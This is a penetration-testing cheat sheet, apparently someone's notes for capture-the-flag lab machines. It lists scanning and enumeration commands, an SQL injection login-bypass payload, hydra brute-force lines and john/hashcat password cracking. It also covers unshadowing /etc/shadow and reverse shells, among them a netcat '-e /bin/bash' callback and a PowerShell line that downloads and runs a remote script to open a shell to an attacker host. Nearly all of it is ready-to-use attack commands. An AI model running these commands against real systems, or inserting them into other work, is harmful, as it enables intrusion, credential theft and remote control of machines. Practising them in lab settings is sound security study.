# _**Some Important Notes**_

-------------------------------------------------------------------------------------------

`verison` 
`1.1.2`

-------------------------------------------------------------------------------------------


`General Nmap Scan`


	nmap -sV -A {machine IP} 


`If ping is being blocked`

	nmap -sV -A {machine IP} -Pn


------------------------------------------------------------------------------------------

`Gobuster`

	gobuster dir -u http://machineip -w wordlists


--------------------------------------------------------------------------------------------

`rust scan`


	rustscan -a {machine IP} -- -A -sC -sV

-------------------------------------------------------------------------------------------------


`enum4linux`

	./enum4linux.pl -U {machine IP} 

`or also -S be used`

	./enum4linux.pl -S {machine IP}

-----------------------------------------------------------------------------------------------

`subclient`


	smbclient -L //10.10.97.76/

	smbclient //10.10.97.76/{directory to access}

--------------------------------------------------------------------------------------------

`SUID permission`

	find / -perm -u=s -type f 2>/dev/null

`Search root flag`

	find / -name root.txt
	
	
----------------------------------------------------------------------------------------------

`Download From Reverse Shell`

`In Reverese shell`

	python3 -m http.server {port}

`In local Machine`

	wget machineip:8000/file.name


`for directory` `sometimes`

	wget --recursive --no-parent  10.10.46.113:8000/{directory}

------------------------------------------------------------------------------------------------------

`linpeas.sh`

	linpeas.sh is the best script for previlage escilation


-------------------------------------------------------------------------------------------------------

`FTP download/upload`

	get -> download file
	put -> upload file

-------------------------------------------------------------------------------------------------------

`sql injection` 
`login bypass`

	 username: ' or 1=1 --
	 password: anything

---------------------------------------------------------------------------------------------------

`netcat`

	nc -nvlp {port}

-------------------------------------------------------------------------------------------------

`PTY shell upgrade`
`Stable Reverse Shell connnection`

        python3 -c 'import pty; pty.spawn("/bin/bash")'

-------------------------------------------------------------------------------------------------
`john the ripper`
`john`

	john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john

-----------------------------------------------------------------------------------------------------

`rsa` 
`ssh2john`

	/usr/share/john/ssh2john.py id_rsa > id_rsa.john 

`then`

       john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john

`john for hash`
	
	john --format=raw-sha1 hash

`ssh2johnhash`

	chmod 600 id_rsa #change mode to initial RSA private key file

`for ssh connection`

	ssh -i id_rsa user@ip 


------------------------------------------------------------------------------------------------------

`hydra`


        hydra -l user -P wordlists.txt {ip} -V http-form-post "page:parameters:string"



`example:`


        hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.208.134 -V http-form-post "wp-login.php:log=^USER^&^PASS^$wp-submit:LogIn&testcookie=1:F=incorrect"


`use burpsuit for rest of info`

--------------------------------------------------------------------------------------------------------

`hydra ssh`

	hydra -l jake -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.215.72 ssh -t 4 
	

-----------------------------------------------------------------------------------------------------


`hashid`

	hashid -m '{hash value}'

`hashcat`

	hashcat -m {mode value from hashid} {hash value} {/wordlists.txt}

-------------------------------------------------------------------------------------------------------------

`sqlmap`

	sqlmap -u http://10.10.71.73 --forms --tamper=space2comment --dump-all -dbms sqlite

----------------------------------------------------------------------------------------------------------------
`steghide`

	steghide extract -sf brooklyn99.jpg
	
`stegcracker`
	
	stegcracker brooklyn99.jpg  /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt

`binwalk`

	binwalk -e file.jpg


-------------------------------------------------------------------------------------------------------------------

`Network File System (NFS) `

`Know mount location` 

	 sudo showmount -e 'machine-ip'

`to mount the file`

	sudo mount -t nfs 'machine-ip':/opt/conf /tmp/mountme

`note` `/opt/conf/ is mount location` `and` `/tmp/mountme` `is where you want to save file`


-------------------------------------------------------------------------------------------------------------------------------------

`Redis`

	redis-cli ip_here  -a password_here

`command for redis interface`
	
	keys * for ls
	get 'filename' for cat

`for more`

	https://redis.io/commands
	
`mysql`

	sudo mysql -h 10.10.229.126 -u root -p

`reversing from netcat`

`on linux machine`

attacker machine 

	nc -nvlp 9578

victim machine

	nc -e /bin/bash {ip of attacker} 9578
	
`on windows machine`

attacker machine 

	stty raw -echo; (stty size; cat) | nc -lvnp 3001
	
victim machine with powershell

	IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001

Cracking Shadow Hash

`copy the file` `/etc/shadow` `and` `/etc/passwd` `to and same path` `then crack with john`

	unshadow passwd shadow > john.hash
	john john.hash --wordlist=/usr/share/wordlists/rockyou.txt 


# @cc github.com/prakashchand72


